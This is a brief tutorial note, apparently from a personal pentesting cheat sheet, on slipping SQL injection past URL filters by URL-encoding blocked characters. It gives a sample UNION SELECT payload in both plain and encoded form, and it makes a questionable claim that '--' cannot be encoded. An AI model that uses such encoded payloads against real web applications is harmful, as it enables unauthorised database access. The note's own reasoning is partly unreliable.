<h1>$${\color{red}Bypass} \space {\color{red}Filter }\space {\color{red}URL }$$</h1>

If we bypass from filter in url, We must using encoding url for change prevnet char like as ***@,',",space,#***

Note: we can't encoding this ```--``` for comment , We can encoding ```#``` ,So we must using ```#``` for comment but encoding to bypass this filter url.

Example:

```
' UNION SELECT NULL,NULL#
```

after encoding url :

```
%27%20UNION%20SELECT%20NULL%2CNULL%23%0A
```

If you want using this encoding , see this website for [encoding online](https://www.urlencoder.org/).
